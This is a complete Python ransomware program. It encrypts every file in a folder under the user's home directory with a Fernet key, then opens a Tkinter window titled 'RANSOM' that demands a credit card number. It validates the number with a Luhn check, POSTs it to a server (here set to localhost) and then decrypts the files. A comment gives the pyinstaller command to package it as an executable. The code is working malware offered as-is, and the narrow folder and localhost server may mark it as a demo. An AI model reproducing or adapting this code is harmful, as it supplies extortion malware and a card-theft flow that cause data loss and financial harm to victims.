import os
import tkinter as tk
from tkinter import messagebox
from cryptography.fernet import Fernet
import requests
import json

# pyinstaller --onefile voucher.py

config = {
    'directory_suffix': '\downloads\delete',
    'server_url': 'http://localhost:8080/'
}


def encrypt_file(file_path, key): 
    fernet = Fernet(key)
    print(fernet)    
    with open(file_path, 'rb') as file:
        original = file.read()
    
    encrypted = fernet.encrypt(original)
    
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)        
    print(f"Encrypted", file_path)


def decrypt_file(file_path, key): 
    fernet = Fernet(key)
    with open(file_path, 'rb') as encrypted_file:
        encrypted = encrypted_file.read()

    decrypted = fernet.decrypt(encrypted)
    
    with open(file_path, 'wb') as file:
        file.write(decrypted)
    print(f"Decrypted", file_path)

def encrypt_files_in_directory(directory_path, key):
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)

def decrypt_files_in_directory(directory_path, key): 
    for filename in os.listdir(directory_path):
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path):
            decrypt_file(file_path, key)

def ask_user_credit_card_and_decrypt_files(directory_path, key, num_blocks = 4, digits_per_block = 4):
    def on_submit():
        card_number = ""
        for entry in entries:
            part = entry.get()
            if not part.isdigit() or len(part) != digits_per_block:
                messagebox.showerror("Error", f"Each block must contain exactly {digits_per_block} digits.")
                return
            card_number += part
            
        if is_valid_credit_card(card_number):
            send_to_server(card_number)
            decrypt_files_in_directory(directory_path, key)
            messagebox.showinfo("Success", "Files decrypted successfully.")
            root.destroy()
        else:
            messagebox.showerror("Error", "Invalid credit card number. Please try again.")
            for entry in entries:
                entry.delete(0, tk.END)
            entries[0].focus()       
            

    def on_key_release(event, next_entry):
        if len(event.widget.get()) == digits_per_block:
            next_entry.focus()

    root = tk.Tk()
    root.title("RANSOM")
    
    tk.Label(root, text=f"This is a RANSOM note!\n Your files have been encrypted!\n Enter your credit card number to get your original files back").pack()

    frame = tk.Frame(root)
    frame.pack()

    entries = []
    for i in range(num_blocks):
        entry = tk.Entry(frame, width=digits_per_block + 1)
        entry.pack(side=tk.LEFT)
        entries.append(entry)
        if i < num_blocks - 1:
            tk.Label(frame, text="-").pack(side=tk.LEFT)

    for i in range(num_blocks - 1):
        entries[i].bind("<KeyRelease>", lambda event, next_entry=entries[i+1]: on_key_release(event, next_entry))

    tk.Button(root, text="Send", command=on_submit).pack()

    root.mainloop()

def is_valid_credit_card(card_number):
    if not card_number.isdigit() or not 13 <= len(card_number) <= 19:
        return False
   
    def luhn_checksum(card_number):
        def digits_of(n):
            return [int(d) for d in str(n)]
        digits = digits_of(card_number)
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum(digits_of(d * 2))
        return checksum % 10
   
    return luhn_checksum(card_number) == 0

def send_to_server(number):
    url = config.get('server_url')
    data = {
        'number': number
    }    
    json_data = json.dumps(data)
    headers = {
        'Content-type': 'application/json'
    }

    try:
        response = requests.post(url, data=json_data, headers=headers)
        
        if response.status_code == 200:
            print("POST request successful.")
            print("Response from server:")
            print(response.text)
        else:
            print(f"POST request failed with status code {response.status_code}.")
            print("Response from server:")
            print(response.text)

    except requests.exceptions.RequestException as e:
        print(f"Error sending POST request: {e}")


if __name__ == "__main__":
    directory_suffix = config.get('directory_suffix')
    directory = os.path.expanduser('~') + directory_suffix
    
    print("Directory to encrypt: " + directory)

    key = Fernet.generate_key()
    
    encrypt_files_in_directory(directory, key)
    
    ask_user_credit_card_and_decrypt_files(directory, key)
